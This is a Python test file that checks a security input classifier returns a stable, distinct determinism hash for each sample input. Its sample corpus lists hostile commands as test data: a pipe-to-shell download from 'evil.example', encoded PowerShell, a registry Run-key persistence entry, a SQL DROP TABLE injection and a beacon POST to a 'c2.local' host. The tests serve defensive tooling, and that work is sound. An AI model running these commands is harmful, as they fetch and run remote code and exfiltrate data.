"""T1.2 · Determinism test.

Same input ⇒ identical determinism_hash across 100 replays.
Different input ⇒ different determinism_hash.
"""
from canonical.iue import classify, RawInput


CORPUS = [
    "powershell -EncodedCommand SGVsbG8=",
    "cmd /c whoami && net user",
    "bash -c 'curl http://evil.example/x.sh | sh'",
    "https://example.com/path?q=1",
    "T1546.004 was observed",
    "wmic process call create \"cmd /c powershell -e SGVsbG8=\"",
    '{"vendor":"cisco","event":{"process":"powershell.exe"}}',
    "192.168.1.10 attempted lateral movement to 10.0.0.5",
    "MZ header content",
    "aGVsbG8gd29ybGQ=",   # base64
    "\x00" * 10 + "text\x01" * 5,
    "empty",
    "",
    "reg add HKCU\\Software\\Run /v evil /d 'malware.exe'",
    "T1059.001 T1055 T1078 techniques",
    "email: attacker@evil.com; ip: 1.2.3.4; hash: 44d88612fea8a8f36de82e1278abb02f",
    "SELECT * FROM users WHERE 1=1; DROP TABLE",
    "Get-Process | Where-Object {$_.CPU -gt 100}",
    "openssl s_client -connect target:443 -showcerts",
    "curl -X POST -d 'a=b' http://c2.local/beacon",
]


def test_determinism_100_replays_same_hash_per_input():
    for text in CORPUS:
        h0 = classify(text).determinism_hash
        for i in range(99):
            h_i = classify(text).determinism_hash
            assert h_i == h0, f"replay {i+1} drifted for input {text!r}"


def test_different_inputs_produce_different_hashes():
    hashes = {classify(t).determinism_hash for t in CORPUS}
    # All distinct (empty and 'empty' differ, etc.).
    assert len(hashes) == len(set(CORPUS)), \
        f"hash collisions detected: {len(hashes)} unique for {len(set(CORPUS))} distinct inputs"


def test_bytes_and_str_of_same_content_produce_stable_hash():
    """RawInput bytes vs. str with identical decoded content are treated
    as different inputs (bytes carries binary intent). Both must be
    self-consistent across replays."""
    s = "some plain text"
    b = s.encode()
    hs = classify(RawInput(payload=s)).determinism_hash
    hb = classify(RawInput(payload=b)).determinism_hash
    # Self-consistency (each stable across replays).
    for _ in range(20):
        assert classify(RawInput(payload=s)).determinism_hash == hs
        assert classify(RawInput(payload=b)).determinism_hash == hb
